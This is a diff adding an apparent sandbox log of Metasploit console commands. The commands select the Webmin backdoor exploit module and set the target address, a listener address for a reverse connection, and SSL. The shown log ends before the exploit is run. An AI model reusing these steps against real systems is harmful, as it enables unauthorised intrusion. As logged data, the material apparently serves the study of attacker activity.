@@ -1,0 +1,5 @@
+{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:41:49.363Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:42:23.803Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 10.1.26.9"}
+{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:42:58.619Z", "cmd_type": "msf-command", "cmd": "set LHOSTS 10.1.135.83"}
+{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:43:03.447Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:43:11.184Z", "cmd_type": "msf-command", "cmd": "set SSL true"}
